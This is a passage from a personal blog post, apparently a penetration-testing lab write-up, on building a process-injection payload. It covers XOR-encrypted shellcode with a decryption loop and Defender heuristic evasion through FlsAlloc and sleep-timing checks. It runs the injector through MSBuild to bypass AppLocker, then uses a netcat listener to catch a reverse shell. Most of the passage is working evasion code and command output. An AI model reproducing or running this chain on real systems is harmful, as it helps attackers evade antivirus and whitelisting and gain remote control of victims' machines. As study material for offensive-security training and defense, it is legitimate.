+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Tools\xor_encrypt.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>XOR encryption with key 0x2a
+</span></span><span style="display:flex;"><span>byte[] buf = new byte[610] {
+</span></span><span style="display:flex;"><span>0xc1, 0x0d, 0x71, 0x79, 0x75, 0x9a, 0xdf, 0xd6, 0x84, 0x5f, 0xd7, 0x7d, 0x73,
+</span></span><span style="display:flex;"><span>0x79, 0x74, 0xa0, 0x2c, 0x1a, 0x2d, 0x62, 0xd5, 0xed, 0x62, 0xd5, 0xec,
+</span></span><span style="display:flex;"><span>0x4c, 0xab, 0x15, 0xb9, 0x1d, 0x5e, 0x2d, 0xaa, 0x14, 0xdf, 0x5f, 0xc0,
+</span></span><span style="display:flex;"><span>0xc1, 0xcc, 0xd5, 0xcb, 0xc2, 0xfe, 0xd5, 0xd5, 0xd5, 0x0b, 0xdf, 0xe0,
+</span></span><span style="display:flex;"><span>0x2c, 0x50, 0x58, 0x54, 0xbb, 0x3b, 0xf7, 0xa5, 0x7e, 0xf6, 0x5c, ...};
+</span></span></code></pre></div><p>and we can add it to the process injection payload with a simple decryption routine at runtime:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] buf = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">610</span>] {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x73</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xec</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0xc0</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0xe0</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0x5c</span>, ...};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; buf.Length; i++) { buf[i] = (<span style="color:#66d9ef">byte</span>)(buf[i] ^ <span style="color:#ae81ff">0x2a</span>); };
+</span></span></code></pre></div><h2 id="microsoft-heuristic-bypass">Microsoft heuristic bypass</h2>
+<p>To avoid any heuristic detection, we can use a few techniques. The first one is to call a rare Win32 API. If the call to this function is not working, we are probably running in an emulation environment by the Antivirus, so we simply exit. I chose to use <a href="https://learn.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc">FlsAlloc</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>IntPtr x = FlsAlloc(IntPtr.Zero);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">uint</span>)x == <span style="color:#ae81ff">0xFFFFFFFF</span>) { <span style="color:#66d9ef">return</span>; }
+</span></span></code></pre></div><p>The next technique is to simply put a sleep function. Usually, when Antivirus sees the sleep, they fast-forward to the next instruction to avoid any latency to the final user. We can simply check if the time elapsed is equal to the time slept. If not, we return:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>DateTime t1 = DateTime.Now;
+</span></span><span style="display:flex;"><span>Sleep(<span style="color:#ae81ff">2000</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">double</span> t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (t2 &lt; <span style="color:#ae81ff">1.5</span>) { <span style="color:#66d9ef">return</span>; }
+</span></span></code></pre></div><p>Now if we compile it and we test with <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Tools\DefenderCheck&gt; .\DefenderCheck.exe .\process_injection.dll
+</span></span><span style="display:flex;"><span>Target file size<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">7168</span> bytes
+</span></span><span style="display:flex;"><span>Analyzing...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exhausted the search. The binary looks good to go!
+</span></span></code></pre></div><p>we see that our effort paid off.</p>
+<h2 id="amsi-bypass">Amsi Bypass</h2>
+<p>Because there is also AppLocker in place, our user can&rsquo;t invoke the .NET framework directly in the terminal; a simple call to a C# function will fail.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\student&gt; [<span style="color:#66d9ef">Math</span>]::Cos(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>Cannot invoke method. Method invocation is supported only on core types <span style="color:#66d9ef">in</span> this language mode.
+</span></span></code></pre></div><p>One way to bypass this is to use a native, signed Windows binary that allows running arbitrary C# code. One solution is to use the <a href="https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2022">MsBuild.exe</a> binary, which can be configured to run tasks with C# code at compile time.</p>
+<p>We have to craft our shellcode injector to be a DLL that inherits the <strong>Task</strong> class of the <strong>Microsoft.Build.Utilities.dll</strong> assembly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Microsoft.Build.Framework;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Microsoft.Build.Utilities;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> MyTasks
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SimpleTask</span> : Task
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">bool</span> Execute()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// put shell code injector here</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>now we create a simple .proj file that call this task at compile time.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Tools\msbuild&gt; type .\myproj.proj
+</span></span><span style="display:flex;"><span>&lt;Project xmlns=<span style="color:#e6db74">&#34;http://schemas.microsoft.com/developer/msbuild/2003&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;UsingTask TaskName=<span style="color:#e6db74">&#34;SimpleTask&#34;</span> AssemblyFile=<span style="color:#e6db74">&#34;c:\Tools\msbuild\TaskMSbuild.dll&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;Target Name=<span style="color:#e6db74">&#34;MyTarget&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;SimpleTask /&gt;
+</span></span><span style="display:flex;"><span>    &lt;/Target&gt;
+</span></span><span style="display:flex;"><span>&lt;/Project&gt;
+</span></span></code></pre></div><h1 id="the-final-payload">The final payload</h1>
+<p>now if we combine all togheter we obtain a code like <a href="https://github.com/GionaBolzer/ProcessHollowing/blob/main/process_injection.cs">this</a>.</p>
+<p>Now our kali box we simply start a listerner</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><p>And of the windows machine, with low user student with AppLocker default rules and Microsoft Defender, we put the .dll and .proj file and we invoke MsBuild</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\student<span style="color:#75715e">&gt;c:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\Tools\msbuild\myproj.proj</span>
+</span></span><span style="display:flex;"><span>Microsoft (R) Build Engine version 4.8.9037.0
+</span></span><span style="display:flex;"><span>[Microsoft .NET Framework, version 4.0.30319.42000]
+</span></span><span style="display:flex;"><span>Copyright (C) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Build started 12/10/2024 12:09:57 PM.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Build succeeded.
+</span></span><span style="display:flex;"><span>    0 Warning(s)
+</span></span><span style="display:flex;"><span>    0 Error(s)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Time</span> Elapsed 00:00:02.35
+</span></span></code></pre></div><p>and we get a reverse shell, super cool &#x1f525;</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+
+
+<div class="flex flex-col">
+  <div class="grid-cols-1 grid gap-1">
+    
+      
+      <img src="/blog/post1/rev_shell/rev_shell_hu16225853902737149401.webp" alt="image" loading="lazy" />
+    
+  </div>
+  
+    <span class="-mt-6 mb-4 text-center text-sm text-slate-700 dark:text-slate-200">
+      reverse shell
+    </span>
+  
+</div>
+
+
+      </span>
+    </article>
+  </div>
+
+      </main>
+    </div>
+    <footer>
+      <div class="flex flex-col justify-center p-10">
+  
+  <p class="text-center text-gray-700 dark:text-gray-200">
+    
+      &copy;
+      2024
+      GionaBolzer
+    
+  </p>
+
+  
+  
+  
+  
+  
+</div>
+    </footer>
+  </body>
+</html>
